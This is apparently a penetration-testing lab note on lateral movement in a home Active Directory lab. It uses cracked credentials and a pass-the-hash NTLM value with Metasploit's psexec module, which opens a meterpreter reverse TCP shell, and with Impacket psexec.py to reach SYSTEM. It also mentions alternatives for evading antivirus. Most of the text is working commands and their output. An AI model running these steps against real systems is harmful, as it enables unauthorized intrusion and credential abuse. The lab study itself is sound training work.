
Once we have [[SMB Relay|captured some hashes]] and [[LLMNR Poisoning|cracked some passwords]] using different attacks, we can utilise them to gain shell access on a machine.

### Metasploit

We can use the `psexec` module available in metasploit to gain a shell as follow. ^shellAccess

```bash
msf6 > use exploit/windows/smb/psexec
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```

This will default to use the payload `windows/x64/meterpreter/reverse_tcp`. However, since we are attacking a `x64` machine, we will have to configure the correct payload.

```bash
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.23.133   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Now we need to set the following options: `RHOSTS`, `SMBDomain`, `SMBUser`, `SMBPass` (obtained [[LLMNR Poisoning#^437ee9|here]])

```bash
msf6 exploit(windows/smb/psexec) > set RHOST 192.168.23.131
RHOST => 192.168.23.131
msf6 exploit(windows/smb/psexec) > set SMBDomain MARVEL.local
SMBDomain => MARVEL.local
msf6 exploit(windows/smb/psexec) > set smbuser fcastle
smbuser => fcastle
msf6 exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
```

We can check out targets from `show targets`. In some cases the *Automatic* option might fail. In those cases, either pick *PowerShell* or *Native upload*

```bash
msf6 exploit(windows/smb/psexec) > show targets 

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload
    4   Command
```

#### Attacking NTLM local user

We can use the hashes from the [[SMB Relay#^c05678|SAM dump]] we extracted through the [[SMB Relay]] attack. Since we are not attacking a user in a domain, we can unset it as well.

```bash
msf6 exploit(windows/smb/psexec) > set SMBUSER administrator
SMBUSER => administrator
msf6 exploit(windows/smb/psexec) > unset SMBDomain 
Unsetting SMBDomain...
```

If we look at the hashes we dumped, there are two parts. The **LM** part and the *NT* part.

Administrator:500:**aad3b435b51404eeaad3b435b51404ee**:*7facdc498ed1680c4fd1448319a8c04f*:::

We can set the SMBPass as the combined NTLM hash and run the exploit.

```bash
msf6 exploit(windows/smb/psexec) > set SMBPASS aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
SMBPASS => aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
msf6 exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.23.133:4444 
[*] 192.168.23.131:445 - Connecting to the server...
[*] 192.168.23.131:445 - Authenticating to 192.168.23.131:445 as user 'administrator'...
[*] 192.168.23.131:445 - Selecting PowerShell target
[*] 192.168.23.131:445 - Executing the payload...
[*] Sending stage (177734 bytes) to 192.168.23.131
[+] 192.168.23.131:445 - Service start timed out, OK if running a command or non-service executable...
[*] Meterpreter session 6 opened (192.168.23.133:4444 -> 192.168.23.131:65011) at 2025-03-04 16:21:58 +1100
```

Even though this hash was dumped from the user `pparker`, since `fcastle` also has the same password the resulting hashes will be the same. Hence, the attack succeeds on `fcastle`.

### psexec.py

We can do this manually instead of using Metasploit by running the script `psexec.py`.

```bash
$ python psexec.py MARVEL/fcastle:'Password1'@192.168.23.131
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.23.131.....
[*] Found writable share ADMIN$
[*] Uploading file TEpiyToQ.exe
[*] Opening SVCManager on 192.168.23.131.....
[*] Creating service UObv on 192.168.23.131.....
[*] Starting service UObv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.5487]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```


We can do the same with a hash as well.

```bash
$ python psexec.py administrator@192.168.23.131 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.23.131.....
[*] Found writable share ADMIN$
[*] Uploading file bGhyEGQv.exe
[*] Opening SVCManager on 192.168.23.131.....
[*] Creating service dBmV on 192.168.23.131.....
[*] Starting service dBmV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.5487]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

If `psexec` is not working for some reason such as an anti-virus detection, there are two other identical options that can be used: `wmiexec.py` and `smbexec.py`.

